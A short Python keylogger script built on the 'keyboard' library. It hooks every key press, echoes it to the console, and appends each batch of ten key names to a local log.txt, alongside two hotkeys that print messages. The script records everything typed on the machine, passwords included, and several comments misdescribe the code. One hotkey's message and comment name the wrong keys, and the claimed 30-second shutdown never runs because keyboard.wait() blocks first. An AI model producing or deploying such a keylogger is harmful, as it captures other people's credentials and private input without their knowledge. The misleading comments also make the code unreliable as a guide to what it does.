import keyboard
import time

keys = [] #initializes the list of 10 keys to send to log.txt when limit is reached

hotkey1 = keyboard.add_hotkey('ctrl + shift + z', lambda: print("shift+a was Pressed!")) #creates hotkey1 when shift+ctrl+z is pressed
hotkey2 = keyboard.add_hotkey('shift + a', lambda: print("shift+a was Pressed!")) #creates hotkey2 when shift+s is pressed

def key_pressed(event): #creates event handler function when key is pressed
    key = (event.name) #creates a key object for each key pressed
    file = open("log.txt", "a") #opens text file in append mode
    print(key) #standard print call for key pressed
    keys.append(event.name) #appends to growing list

    if len(keys) == 10: #when list is 10 the loop will write to the file log.txt
        for element in keys:
            file.write(element)
        file.write("\n") #makes sure each entry is on a new line
        keys.clear() #clears array for the next 10 elements pressed
    file.close() #closes the file

keyboard.on_press(key_pressed) #event handler for when key pressed to call the function made above12234567890
keyboard.wait() #waits for next key pressed
time.sleep(30) #has program terminate after 30 seconds
